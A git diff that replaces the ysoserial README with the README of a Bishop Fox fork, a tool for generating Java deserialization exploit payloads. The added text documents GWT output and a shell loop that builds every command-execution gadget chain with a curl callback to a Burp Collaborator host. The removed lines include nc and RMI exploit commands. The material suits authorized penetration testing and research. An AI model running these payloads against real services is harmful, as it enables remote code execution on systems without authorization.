@@ -1,128 +1,108 @@
+# ysoserial - Bishop Fox fork
 
-# ysoserial
+This is a fork of [ysoserial](https://github.com/frohoff/ysoserial) that incorporates some additional features. Refer to the original project for most of the documentation.
 
-[![GitHub release](https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)
-[![Travis Build Status](https://api.travis-ci.com/frohoff/ysoserial.svg?branch=master)](https://travis-ci.com/frohoff/ysoserial)
-[![Appveyor Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)
+## GWT serialization output
 
-A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
+The original motivation for this fork was to add support for the nonstandard serialization format used by Google Web Toolkit (GWT). To output in GWT format, add the `--gwt` option, with a field name, e.g. `--gwt default`, `--gwt bishopfox`, etc. It's not necessary to pick a valid field name, but GWT will get a little farther in its deserialization logic if the field name is valid for the type of object the payload is being injected into, and this might be beneficial in some cases.
 
-![logo](ysoserial.png)
+You can try out the GWT serialization output feature using [the example vulnerable GWT web app](https://github.com/BishopFox/VulnerableGWTApp) discussed in [the Bishop Fox blog post "GWT: An Eight-Year-Old Unpatched Java Deserialization Vulnerability"](https://bishopfox.com/blog)
 
-## Description
+## Merged back-catalogue pull requests
 
-Originally released as part of AppSecCali 2015 Talk
-["Marshalling Pickles: how deserializing objects will ruin your day"](
-        https://frohoff.github.io/appseccali-marshalling-pickles/)
-with gadget chains for Apache Commons Collections (3.x and 4.x), Spring Beans/Core (4.x), and Groovy (2.3.x).
-Later updated to include additional gadget chains for
-[JRE <= 1.7u21](https://gist.github.com/frohoff/24af7913611f8406eaf3) and several other libraries.
+This fork also includes content from 11 unmerged pull requests in the mainline project that seemed useful:
 
-__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java
-libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of
-objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
-serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
-this data, the chain will automatically be invoked and cause the command to be executed on the application host.
+* [PR#200 - Jython2 payload](https://github.com/frohoff/ysoserial/pull/200) (renamed Jython3 to avoid conflict with PR#153)
+* [PR#192 - MozillaRhino3 payload](https://github.com/frohoff/ysoserial/pull/192)
+* Partial implementation of [PR#189 - Improved command-line handling](https://github.com/frohoff/ysoserial/pull/189) (adds the argument-handling logic, but not the -s and -p options because they seemed potentially fragile)
+* [PR#184 - Improved C3P0 payload](https://github.com/frohoff/ysoserial/pull/184) (implemented as a new "C3P02" payload so the original version can still be easily used)
+* [PR#177 - WildFly1 payload](https://github.com/frohoff/ysoserial/pull/177)
+* [PR#172 - TLS support for RMIRegistryExploit utility](https://github.com/frohoff/ysoserial/pull/172)
+* [PR#167 - ROME2 payload](https://github.com/frohoff/ysoserial/pull/167)
+* [PR#162 - RMIRegistryExploit utility should only call createMemoitizedProxy if the payload is not already a Remote instance](https://github.com/frohoff/ysoserial/pull/162)
+* [PR#159 - Jdk7u21variant payload](https://github.com/frohoff/ysoserial/pull/159)
+* [PR#153 - Jython2 and JythonZeroFile payloads](https://github.com/frohoff/ysoserial/pull/153)
+* [PR#134 - Improved help message output](https://github.com/frohoff/ysoserial/pull/134) (modified the default width from 210 to 80 for better compatibility)
 
-It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
-gadgets on the classpath.
+# Usage
 
-## Disclaimer
+First, compile the code using the same steps as for the main project:
 
-This software has been created purely for the purposes of academic research and
-for the development of effective defensive techniques, and is not intended to be
-used to attack systems except where explicitly authorized. Project maintainers
-are not responsible or liable for misuse of the software. Use responsibly.
-
-## Usage
-
-```shell
-$  java -jar ysoserial.jar
-Y SO SERIAL?
-Usage: java -jar ysoserial.jar [payload] '[command]'
-  Available payload types:
-     Payload             Authors                     Dependencies
-     -------             -------                     ------------
-     AspectJWeaver       @Jang                       aspectjweaver:1.9.2, commons-collections:3.2.2
-     BeanShell1          @pwntester, @cschneider4711 bsh:2.0b5
-     C3P0                @mbechler                   c3p0:0.9.5.2, mchange-commons-java:0.2.11
-     Click1              @artsploit                  click-nodeps:2.3.0, javax.servlet-api:3.1.0
-     Clojure             @JackOfMostTrades           clojure:1.8.0
-     CommonsBeanutils1   @frohoff                    commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
-     CommonsCollections1 @frohoff                    commons-collections:3.1
-     CommonsCollections2 @frohoff                    commons-collections4:4.0
-     CommonsCollections3 @frohoff                    commons-collections:3.1
-     CommonsCollections4 @frohoff                    commons-collections4:4.0
-     CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
-     CommonsCollections6 @matthias_kaiser            commons-collections:3.1
-     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
-     FileUpload1         @mbechler                   commons-fileupload:1.3.1, commons-io:2.4
-     Groovy1             @frohoff                    groovy:2.3.9
-     Hibernate1          @mbechler
-     Hibernate2          @mbechler
-     JBossInterceptors1  @matthias_kaiser            javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
-     JRMPClient          @mbechler
-     JRMPListener        @mbechler
-     JSON1               @mbechler                   json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
-     JavassistWeld1      @matthias_kaiser            javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
-     Jdk7u21             @frohoff
-     Jython1             @pwntester, @cschneider4711 jython-standalone:2.5.2
-     MozillaRhino1       @matthias_kaiser            js:1.7R2
-     MozillaRhino2       @_tint0                     js:1.7R2
-     Myfaces1            @mbechler
-     Myfaces2            @mbechler
-     ROME                @mbechler                   rome:1.0
-     Spring1             @frohoff                    spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
-     Spring2             @mbechler                   spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
-     URLDNS              @gebl
-     Vaadin1             @kai_ullrich                vaadin-server:7.7.14, vaadin-shared:7.7.14
-     Wicket1             @jacob-baines               wicket-util:6.23.0, slf4j-api:1.6.4
+```
+mvn clean package -DskipTests
 ```
 
-## Examples
+Once compiled, using this fork of `ysoserial` is the same as the standard version unless you want to output in GWT mode.
 
-```shell
-$ java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd
-0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
-0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
-0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
-...
-0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
-0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
-0000570: 0078 7071 007e 003a                      .xpq.~.:
-
-$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
-$ nc 10.10.10.10 1099 < groovypayload.bin
-
-$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
+```
+Usage: java -jar ysoserial-[version]-all.jar [options] <payload> '<command>'
+  Options:
+    -h,--help                  Print usage
+    -G,--gwt <field name>      Output in Google Web Toolkit (GWT) serialization format:
+      ex. --gwt default
 ```
 
-## Installation
+# Quickly trying all command execution payloads
 
-[![GitHub release](https://img.shields.io/github/downloads/frohoff/ysoserial/latest/total)](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar)
+Trying `URLDNS` first with a URL based on your Burp Suite Collaborator hostname is always a good idea, because most systems can resolve public DNS names. If you've confirmed that `URLDNS` works, but want to attempt actual code execution, this section provides an option for building all of the OS command execution payloads, which you can then copy/paste into Burp Repeater or similar.
 
-Download the [latest release jar](https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar) from GitHub releases.
+These steps generate all possible OS command execution payloads for testing in conjunction with a Burp Suite Collaborator server in a way that will let you know which (if any) succeeded. The way this is accomplished is by executing a command that makes and HTTP request to your Collaborator server for a URI named after the payload. So if you see entries in your Collaborator console for `/CommonsBeanutils1`, you know that the `CommonsBeanutils1` gadget chain works against the target.
 
-## Building
+This example uses `curl`, which will of course fail if a system is vulnerable but does not have `curl` installed. You could modify the steps to try the same approach using `wget`, `nc`, etc. If none of those work, you could use `ping -c3`, `nslookup`, or `host`, but those will only let you know that a command succeeded, not which payload was responsible. 
 
-Requires Java 1.7+ and Maven 3.x+
+First create a file named `command_execution_payloads.txt` containing the following lines:
 
-```mvn clean package -DskipTests```
+```
+BeanShell1
+C3P0
+C3P02
+Click1
+Clojure
+CommonsBeanutils1
+CommonsCollections1
+CommonsCollections2
+CommonsCollections3
+CommonsCollections4
+CommonsCollections5
+CommonsCollections6
+CommonsCollections7
+Groovy1
+Hibernate1
+Hibernate2
+JavassistWeld1
+JBossInterceptors1
+Jdk7u21
+Jdk7u21variant
+JSON1
+Jython2
+Jython3
+JythonZeroFile
+MozillaRhino1
+MozillaRhino2
+MozillaRhino3
+ROME
+ROME2
+Spring1
+Spring2
+Vaadin1
+```
 
-## Code Status
+Then execute the following commands, substituting the Collaborator DNS name and your `ysoserial` JAR path (e.g. `target/ysoserial-0.0.6-SNAPSHOT-all.jar`) where indicated. 
 
-[![Build Status](https://travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)
-[![Build status](https://ci.appveyor.com/api/projects/status/a8tbk9blgr3yut4g/branch/master?svg=true)](https://ci.appveyor.com/project/frohoff/ysoserial/branch/master)
+```
+export COLLABORATOR="<your Collaborator DNS name here>"
+export YSOSERIAL="<your ysoserial JAR path here>"
+export FIELDNAME="bishopfox"
+mkdir "payloads-${COLLABORATOR}-curl"
 
-## Contributing
+while read pn; do \
+   java -jar "${YSOSERIAL}" \
+   --gwt "${FIELDNAME}" \
+   "${pn}" \
+   "curl http://${COLLABORATOR}/${pn}" \
+   | base64 -w0 | sed 's/+/\$/g' | sed 's./._.g' \
+   > "payloads-${COLLABORATOR}/${pn}.bin.b64"; \
+   done<command_execution_payloads.txt
+```
 
-1. Fork it
-2. Create your feature branch (`git checkout -b my-new-feature`)
-3. Commit your changes (`git commit -am 'Add some feature'`)
-4. Push to the branch (`git push origin my-new-feature`)
-5. Create new Pull Request
-
-## See Also
-* [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet): info on vulnerabilities, tools, blogs/write-ups, etc.
-* [marshalsec](https://github.com/frohoff/marshalsec): similar project for various Java deserialization formats/libraries
-* [ysoserial.net](https://github.com/pwntester/ysoserial.net): similar project for .NET deserialization
+You can then copy/paste the payloads into Burp Repeater or similar.
